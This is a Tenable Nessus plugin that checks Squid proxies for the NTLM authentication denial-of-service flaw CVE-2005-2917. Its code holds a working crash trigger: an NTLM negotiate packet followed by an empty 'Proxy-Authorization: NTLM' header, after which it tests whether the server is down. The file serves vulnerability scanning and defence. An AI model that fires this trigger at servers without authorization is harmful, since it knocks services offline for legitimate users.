#
# (C) Tenable Network Security
#


if (description) {
  script_id(20010);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2005-2917");
  script_bugtraq_id(14977);

  name["english"] = "Squid NTLM Authentication Denial Of Service Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web proxy server is prone to denial of service attacks. 

Description :

The version of Squid, an open-source web proxy cache, installed on the
remote host will abort if it receives a specially-crafted NTLM
challenge packet.  A remote attacker can exploit this issue to stop
the affected application, thereby denying access to legitimate users. 

See also :

http://www.squid-cache.org/bugs/show_bug.cgi?id=1391

Solution : 

Apply the patch referenced in the bug report or upgrade to Squid
2.5.STABLE11 or later. 

Risk factor : 

Medium / CVSS Base Score : 4 
(AV:R/AC:L/Au:NR/C:N/A:P/I:N/B:A)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for NTLM authentication denial of service vulnerability in Squid";
  script_summary(english:summary["english"]);
 
  script_category(ACT_DENIAL);
  script_family(english:"Denial of Service");
 
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("proxy_use.nasl");
  script_require_ports("Services/http_proxy", 8080, 3128);

  exit(0);
}


include("http_func.inc");
include("global_settings.inc");
include("misc_func.inc");


port = get_kb_item("Services/http_proxy");
if (!port) port = 3128;
if (!get_port_state(port)) exit(0);


# Make sure it's Squid.
soc = open_sock_tcp(port);
if (!soc) exit (0);
req = http_get(
  item:string("http://www.f0z73", rand() % 65536, "tinker.com/"),
  port:port
);
send(socket:soc, data:req);
res = http_recv(socket:soc);
close(soc);
if (res == NULL) exit(0);


# If it is...
if ("Server: squid" >< res) {
  # And it's using NTLM authentication...
  if ("Proxy-Authenticate: NTLM" >< res) {
    soc = open_sock_tcp(port);
    if (!soc) exit (0);

    # nb: Squid's authentication protocol is outlined at:
    #     <http://squid.sourceforge.net/ntlm/client_proxy_protocol.html> 

    # Send a negotiate packet.
    negotiate = raw_string(
      "NTLMSSP", 0x00,                          # NTLMSSP identifier
      0x01, 0x00, 0x00, 0x00,                   # NTLMSSP_NEGOTIATE
      0x07, 0x82, 0x08, 0x00,                   # flags
      crap(length:8, data:raw_string(0x00)),    # calling workstation domain (NULL)
      crap(length:8, data:raw_string(0x00)),    # calling workstation name (NULL)
      0x00
    );
    req1 = str_replace(
      string:req,
      find:"User-Agent:",
      replace:string(
        "Proxy-Connection: Keep-Alive\r\n" ,
        "Proxy-Authorization: NTLM ", base64(str:negotiate), "\r\n",
        "User-Agent:"
      )
    );
    send(socket:soc, data:req1);
    res = http_recv(socket:soc);
    if (res == NULL) exit(0);

    # If the server returned a challenge packet...
    if ("Proxy-Authenticate: NTLM Tl" >< res) {
      # Try to crash it.
      req2 = str_replace(
        string:req,
        find:"User-Agent:",
        replace:string(
          "Proxy-Connection: Keep-Alive\r\n" ,
          # nb: a vulnerable server exits w/o a packet.
          "Proxy-Authorization: NTLM\r\n",
          "User-Agent:"
        )
      );
      send(socket:soc, data:req2);
      res = http_recv(socket:soc);

      # If there was no result, make sure it's down.
      if (res == NULL) {
        soc2 = open_sock_tcp(port);
        # There's a problem if we can't reconnect.
        if (!soc2) {
          security_warning(port);
          exit(0);
        }
        else close(soc2);
      }
      else close(soc);
    }
  }
}
